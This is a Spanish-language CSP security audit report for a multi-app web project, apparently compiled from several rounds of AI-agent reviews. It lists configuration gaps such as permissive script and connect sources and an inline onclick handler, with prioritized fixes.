| #1 | 2026-03-16 | 17 | 0 | 17 | Analisis inicial: spec vs implementacion, limitaciones de framework |
| #2 | 2026-03-16 | 8 | 0 | 25 | Analisis profundo: code review exhaustivo, desviaciones spec-codigo, test coverage |
| #3 | 2026-03-16 | 13 | 3 elevados a CRITICAL | 38 | Security review: vectores de bypass CSP, directivas faltantes, allowlists permisivas |
| #4 | 2026-03-17 | 3 | 4 elevados (ver tabla) | 41 | Auditoria multi-agente exhaustiva: spec analysis + code analysis + test coverage + security expert |
| #5 | 2026-03-17 | 3 | 2 elevados (ver tabla) | 44 | 4 agentes paralelos (web CSP, admin CSP, API/tests/cross-cutting, security expert CSP). Hallazgo critico: onclick en 500.astro. Pipeline report-uri no verificada E2E |
| #6 | 2026-03-17 | 2 | 0 | **46** | 6 agentes paralelos: spec+gaps, web CSP exhaustivo, admin CSP exhaustivo, API security, tests/infra, deep gap hunt (React clients, error pages, auth flows, SW, View Transitions, Shadcn, devtools, third-party URLs). Auditoria de CONFIRMACION: 44 gaps previos validados, 2 gaps nuevos (inline styles admin, CI linter CSP). Confirmaciones positivas: View Transitions safe, Shadcn safe, no service workers, sanitizacion HTML correcta, scripts Astro sin is:inline se bundlean como ES modules |
| #7 | 2026-03-17 | 3 | 0 | **49** | 6 agentes paralelos: spec analysis exhaustivo, web CSP (scripts/styles/terceros), admin CSP (middleware/nonce/versions), API security (CORS/route factory/env), busqueda de 17 vectores de ataque nuevos, verificacion de 15 items criticos. Auditoria de CONFIRMACION INDEPENDIENTE: 46 gaps previos validados, 3 gaps nuevos (specs inexistentes, https: wildcard, coherencia meta-header). Confirmaciones positivas: no hay createElement('script'), no hay eval(), no hay postMessage sin validacion, no hay innerHTML sin sanitizacion, no hay WebSockets, no hay SVG scripts, no hay CSS @import externo |
| #8 | 2026-03-17 | 3 | 0 | **52** | 4 agentes: verificacion task-por-task (T-001 a T-038), busqueda de 15 areas no cubiertas, revision de seguridad CSP independiente, auditoria profunda admin. Auditoria POST-CONSOLIDACION: T-016 no completada (inline style en router.tsx), admin vercel.json sin CSP fallback, tasks no formalizadas. Confirmaciones: forgot-password.astro es ES module (safe), Better Auth/Sentry/MercadoPago no inyectan inline scripts |

---

## Conclusiones

1. **NUEVO (auditoria #5): Inline `onclick` en 500.astro VIOLA CSP directamente** (GAP-042-42). El boton "Retry" tiene `onclick="window.location.reload()"` que es bloqueado por CSP sin `'unsafe-inline'` en `script-src`. Dado que Astro `experimental.csp` genera CSP ENFORCING via `<meta>` tag, este boton YA NO FUNCIONA en produccion. Fix trivial (~5 lineas)
2. **NUEVO (auditoria #5): Pipeline de CSP violation reporting NO verificada E2E** (GAP-042-43). No sabemos si las violations llegan a Sentry. Los 14 dias de observacion de SPEC-046 son inutiles sin verificar que la pipeline funciona
3. **CRITICO (auditoria #4): API route factory anula CSP del security middleware** (GAP-042-39). El `route-factory.ts` HARDCODEA `'unsafe-inline'` + CDN domains (`cdn.jsdelivr.net`, `unpkg.com`) en TODAS las rutas API. La politica estricta de `security.ts` (`scriptSrc: ["'self'"]`) queda SOBREESCRITA. Este es un fix de seguridad INMEDIATO que no requiere spec
4. **CRITICO: Phase 1 NO es puramente Report-Only** (GAP-042-03 elevado a CRITICAL). Astro `experimental.csp` genera una politica CSP ENFORCING via `<meta>` tag, mientras el middleware solo reporta. Esto significa que scripts/recursos que no pasen la politica de Astro ya estan siendo BLOQUEADOS en produccion. Requiere decision arquitectural inmediata
5. **Phase 2 (Enforcement) es INALCANZABLE** sin resolver: Vite 7 migration, staging environment, eliminacion de `'unsafe-inline'`, y las 3 implementaciones faltantes en router.tsx (GAP-042-18/19/21)
6. **Admin SSR tiene ZERO proteccion CSP** (GAP-042-13 elevado a CRITICAL). El middleware solo cubre server functions, no el render SSR inicial. La pagina HTML que el usuario recibe al cargar la app NO tiene header CSP
7. **Existen 12+ fixes triviales** que mejoran significativamente la postura de seguridad sin riesgo: onclick fix (HIGH), route factory fix (CRITICO), upgrade-insecure-requests, frame-src, media-src, font-src, X-XSS-Protection, Permissions-Policy, API docs bypass, nonce tests
8. **`*.vercel.app` en connect-src es un bypass de exfiltracion** (GAP-042-38). Cualquier atacante con script injection puede exfiltrar datos a una app Vercel propia. Debe restringirse a dominios de deployment especificos
9. **`img-src https:` permite exfiltracion via image URLs** (GAP-042-27, elevado a HIGH). No requiere script injection, solo HTML injection
10. **`'unsafe-eval'` en admin CSP debe verificarse AHORA** (GAP-042-04, elevado a HIGH). No diferir a SPEC-046.. verificar con network devtools si MercadoPago `security.js` se carga. Si no, remover inmediatamente
11. **La spec original es de alta calidad**: 56 revisiones, findings detallados, workarounds documentados. La mayoria de gaps son consecuencia de limitaciones de framework que la spec reconoce
12. **Auditoria #2 revelo desviaciones spec-codigo**: getCspNonce, createIsomorphicFn, ssr.nonce NO estan implementados (limitacion de framework, no omision)
13. **Test coverage es menor al especificado**: Falta ~3-4 tests para cumplir minimo de spec + tests de seguridad del nonce inexistentes (GAP-042-41)
14. **10+ scripts inline en web no documentados**: Solo 2 mencionados en spec, 10+ mas descubiertos. El onclick en 500.astro paso desapercibido por 4 auditorias previas.. solo la busqueda exhaustiva de event handlers lo detecto
15. **Confirmacion positiva (auditoria #5)**: La implementacion base es solida para Phase 1. El diseno dual-policy (meta + header) es CORRECTO y bien documentado. Los helpers (`buildSentryReportUri`, `buildCspDirectives`) tienen tests adecuados. No se encontraron vulnerabilidades de XSS en el codigo propio (sanitize-html + DOMPurify correctamente usados)
16. **CONFIRMACION EXHAUSTIVA (auditoria #6)**: Verificacion completa con 6 agentes especializados confirma que los 44 gaps previos siguen vigentes. Se verifico CADA pagina .astro, CADA componente React client, CADA punto de inyeccion HTML. Resultados positivos: View Transitions (9 archivos) generan CSS puro auto-hasheado (CSP-safe), Shadcn UI usa React handlers (CSP-safe), no hay service workers ni PWA patterns, Google Fonts correctamente whitelisted, scripts Astro sin `is:inline` se bundlean como ES modules externos (CSP-safe), TODOS los usos de `set:html` (8 instancias) pasan por sanitize-html o escape adecuado
17. **NUEVO (auditoria #6): Admin tiene 14+ inline styles dinamicos** (GAP-042-45). No afecta Phase 1/2, pero bloquea futura remocion de `'unsafe-inline'` en `style-src`. Documentado como deuda tecnica
18. **NUEVO (auditoria #6): Sin CI linter para patrones CSP-incompatibles** (GAP-042-46). El `onclick` de 500.astro paso desapercibido por 4 auditorias. Un grep automatico en CI detectaria estos patrones antes de produccion (~15 lineas de script)
19. **RESUELTO (consolidacion 2026-03-17)**: SPEC-046 y SPEC-047 fusionadas en SPEC-042 como Phase 1.1 (quick wins), Phase 1.2 (unsafe-inline removal), y Phase 1.3 (structural improvements). Solo SPEC-045 se mantiene como spec separada. La observacion de 14 dias se convierte en QA checklist
20. **NUEVO (auditoria #7): `https:` wildcard en `script-src` redundante y peligroso** (GAP-042-48). En browsers CSP1, permite scripts de cualquier dominio HTTPS. En CSP2+, es ignorado por `'strict-dynamic'`. Se puede remover sin impacto
21. **NUEVO (auditoria #7): Dual-policy CSP sin validacion de coherencia** (GAP-042-49). Astro meta tag y HTTP header middleware pueden divergir silenciosamente. No hay test ni linter que detecte incoherencias. Cambios en una fuente pueden romper la otra sin warning
22. **CONFIRMACION EXHAUSTIVA (auditoria #7)**: Verificacion de 17 vectores de ataque confirma que la codebase es limpia: no hay dynamic script injection, no hay eval/Function en source code, no hay postMessage sin validacion de origen, no hay innerHTML/dangerouslySetInnerHTML sin sanitizacion, no hay WebSockets, no hay SVG con scripts, no hay CSS @import externo, no hay meta refresh. La postura de seguridad base del codigo propio es SOLIDA
23. **NUEVO (auditoria #8): T-016 marcada completa pero NO implementada** (GAP-042-50). El inline `style={{animation}}` sigue en `router.tsx:30`. El keyframe fue movido a CSS pero el componente sigue aplicandolo via inline style prop. Fix trivial: cambiar a className
24. **NUEVO (auditoria #8): Admin SSR sin CSP fallback** (GAP-042-51). Como workaround para GAP-042-13 (middleware no cubre SSR), se puede agregar un CSP basico estatico en `admin/vercel.json`. Es mas debil que el dinamico pero infinitamente mejor que NADA
25. **CONFIRMACION POSITIVA (auditoria #8)**: Multiples areas verificadas como limpias: forgot-password.astro usa ES module (CSP-safe, el agente #2 lo confundio con inline script pero scripts Astro sin `is:inline` se bundlean automaticamente), Better Auth no inyecta scripts, MercadoPago SDK carga via ESM, Sentry no usa inline scripts en SSR, 40 route components usan factory functions sin inline styles. La codebase admin es fundamentalmente CSP-safe salvo por las limitaciones de TanStack Start v1.131.26

### Recomendaciones Inmediatas (priorizadas)

**FIX DE SEGURIDAD INMEDIATO** (no esperar):

- **GAP-042-39**: Mover CSP permisivo del route factory SOLO a rutas `/docs/*`. TODAS las demas rutas deben usar la politica estricta de `security.ts`. Este gap permite XSS y carga de scripts desde CDNs publicos en TODAS las rutas API
- **GAP-042-42**: Reemplazar `onclick="window.location.reload()"` en 500.astro con `addEventListener` en un `<script>` tag (~5 lineas). **YA ESTA ROTO** en produccion si experimental.csp esta activo

**DECISIONES REQUERIDAS** (usuario):

- GAP-042-03: Decidir si deshabilitar `experimental.csp` para tener Phase 1 puramente Report-Only, o aceptar enforcement parcial
- GAP-042-04: Verificar si MercadoPago `security.js` se carga realmente. Si no, remover `'unsafe-eval'`
- GAP-042-43: Verificar que la pipeline report-uri -> Sentry funciona ANTES de iniciar la observacion de 14 dias

**DEPENDENCIAS ROTAS** (crear specs):

- GAP-042-47: **RESUELTO** (2026-03-17). SPEC-046/047 fusionadas en SPEC-042 Phase 1.1/1.2/1.3. Solo SPEC-045 pendiente como spec separada

**Fixes directos (sin spec nueva, sin riesgo)**:

1. GAP-042-39: **CRITICO** - Route factory CSP permisivo en todas las rutas (~20 lineas)
2. GAP-042-42: **HIGH** - onclick en 500.astro viola CSP (~5 lineas)
3. GAP-042-26: Agregar `upgrade-insecure-requests` a las 3 apps (HIGH, 1 linea x 3)
4. GAP-042-30: API docs bypass solo CSP, no todos los headers (HIGH, ~5 lineas)
5. GAP-042-37: `X-XSS-Protection: '0'` en API security middleware (MEDIUM, 1 linea)
6. GAP-042-33: `frame-src 'none'` en web CSP (LOW, 1 linea)
7. GAP-042-35: `media-src 'self'` en web y admin (LOW, 1 linea x 2)
8. GAP-042-36: `font-src: 'none'` en API (LOW, 1 linea)
9. GAP-042-32: Permissions-Policy completo en web/admin vercel.json (MEDIUM, editar JSON)
10. GAP-042-23: Agregar 3-4 tests faltantes de spec (MEDIUM, ~50 lineas)
11. GAP-042-41: Agregar tests de seguridad del nonce (MEDIUM, ~30 lineas)
12. GAP-042-46: Agregar CI grep check para onclick/onload/eval en .astro y .tsx (MEDIUM, ~15 lineas)
13. GAP-042-09: Actualizar default CSP en API env.ts (LOW, 1 linea)
14. GAP-042-48: Remover `https:` de `script-src` en web middleware (MEDIUM, 1 token)

**Dependencias de specs existentes**:

- Activar SPEC-046 y SPEC-025 como prioridad para desbloquear Phase 2
- SPEC-045 (Vite 7) debe incluir: GAP-042-18 (getCspNonce), GAP-042-19 (TanStack upgrade), GAP-042-21 (createStart API)
- SPEC-046 debe incluir como prerequisito: GAP-042-43 (verificar pipeline report-uri E2E)

**Specs nuevas necesarias**:

- SPEC para eliminar `is:inline` y `'unsafe-inline'` de script-src (pre-Phase 2)
- SPEC para Trusted Types (Phase 3 enhancement)
- SPEC para remocion de `'unsafe-inline'` de admin `style-src` (Phase 3, depende de GAP-042-45: 14+ inline styles dinamicos en React components)
